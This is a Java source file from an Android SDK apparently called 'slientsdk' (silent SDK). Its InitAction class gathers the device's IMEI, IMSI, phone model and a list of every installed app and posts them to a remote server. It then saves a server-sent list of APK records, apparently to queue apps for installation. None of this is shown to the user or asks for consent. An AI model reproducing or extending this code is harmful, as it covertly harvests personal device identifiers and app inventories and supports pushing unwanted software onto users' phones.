package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.SQLException;
import java.util.List;

import sdk.grayweb.com.slientsdk.api.InitApi;
import sdk.grayweb.com.slientsdk.http.HttpClient;
import sdk.grayweb.com.slientsdk.http.TextHttpListener;
import sdk.grayweb.com.slientsdk.model.ApkModel;
import sdk.grayweb.com.slientsdk.model.InstallApk;
import sdk.grayweb.com.slientsdk.util.DivesUtil;

/**
 * Created by engine on 16/5/16.
 */
public class InitAction extends AbstractAction {
    public InitAction(Context context) {
        super(context);
    }

    @Override
    public int doAction() {
        InitApi api = new InitApi();
        api.chanelid = 1;
        api.imei = DivesUtil.getInstance(mContext).getDeviceCode();
        api.imsi = DivesUtil.getInstance(mContext).getImsi();
        api.installApp = getInstallAppString();
        api.phoneName = DivesUtil.getInstance(mContext).getPhoneModel();
        HttpClient.request(api, new TextHttpListener(mContext) {
            @Override
            public void onSuccess(String text) {
                try {
                    JSONObject jsonObject = new JSONObject(text);
                    JSONArray apklist = jsonObject.optJSONArray("data");
                    if(apklist!=null) {
                        List<ApkModel> apks = jsonArrayToList(apklist, ApkModel.class);
                        for (ApkModel apk :
                                apks) {
                            apkModelDao.createOrUpdate(apk);
                        }
                    }else {
                        Log.e(TAG,text);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        });
        return 1;
    }

    public List<ApkModel> getAllApkModel(){
        try {
            return  apkModelDao.queryForAll();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null ;
    }

    private String getInstallAppString() {
        StringBuilder sb = new StringBuilder();
        for (InstallApk apk :
                installedApks()) {
            sb.append(apk.name).append("|").append(apk.packageName).append(",");
        }
        return sb.substring(0, sb.length() - 1);
    }
}
